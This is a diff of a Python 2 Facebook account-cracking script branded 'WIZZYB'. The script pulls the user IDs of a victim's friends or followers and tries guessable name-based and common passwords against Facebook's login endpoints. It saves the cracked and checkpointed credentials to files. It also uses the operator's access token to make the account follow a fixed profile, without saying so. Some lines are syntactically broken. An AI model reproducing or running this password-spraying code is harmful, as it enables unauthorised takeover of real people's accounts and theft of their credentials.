@@ -67,7 +67,7 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		token = raw_input("\033[1;31mLOGIN WITH ACCESS TOKEN\033[1;33m : ")
+		token = raw_input("\033[1;31mLOGIN WITH ACCESS TOKEN \033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
              
@@ -75,7 +75,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)     
+			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      # Dapunta Khurayra X
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -100,7 +100,7 @@ def menu():
 	
 	print("\n\033[1;97m[\033[1;92m01\033[1;97m] crack ID from public friends")
 	print("\033[1;97m[\033[1;92m02\033[1;97m] crack ID from public followers ")
-	print("\033[1;97m[\033[1;92m03\033[1;97m] WIZZYB Massive ID's crack Pro\033[1;93m [ \033[1;95mPRO \033[1;97m]")
+	print("\033[1;97m[\033[1;92m03\033[1;97m] Wizzyb Massive ID's crack Pro\033[1;93m [ \033[1;95mPRO \033[1;97m]")
 	print("\033[1;97m[\033[1;92m04\033[1;97m] Chack Crack Results")
 	print("\033[1;97m[\033[1;92m05\033[1;97m] User Agent settings\033[1;97m [ \033[1;95mPRO \033[1;97m]")
 	print("\033[1;97m[\033[1;92m00\033[1;97m] Exit\033[1;97m [ \033[1;91mLogout\033[1;97m]")
@@ -264,7 +264,7 @@ def cek_ttl_cp(uid, pw):
 			month = bulan_ttl[month]
 			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s|%s %s\n"%(uid, pw, day, month, year))
+			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
 		day = (" ")
 		month = (" ")
@@ -282,13 +282,13 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	elif len(name)<=2:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	elif len(name)<=3:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	else:
-		pwx = [ name+"123456789", name+"123456"]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -296,19 +296,19 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;97m[\033[1;92mWIZZYB-OK\033[1;97m]\033[1;92m %s|%s|%s\033[0;97m"%(uid, pw))
+				print("\r\033[1;97m[\033[1;96mWIZZYB-OK\033[1;97m]\033[1;92m %s|%s|%s\033[0;97m"%(uid, pw))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[\033[1;95mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
+				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s |%s | %s"%(uid, pw))
 				cp.append("%s | %s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s | %s\n"%(uid, pw))
 				break
@@ -329,13 +329,13 @@ def mbasic(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	elif len(name)<=2:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	elif len(name)<=3:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	else:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
@@ -360,7 +360,7 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;97m[\033[1;93mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -381,7 +381,7 @@ def mobile(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name+"0000", "password", "facebook", "qwerty12345", "qwerty12", "qwerty", "qwerty11", name+"234", name+"111", name+"123", name+"1234", name+"12345", "223344", "334455", "123456", "445566" ]
+		pwx = [ name, name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
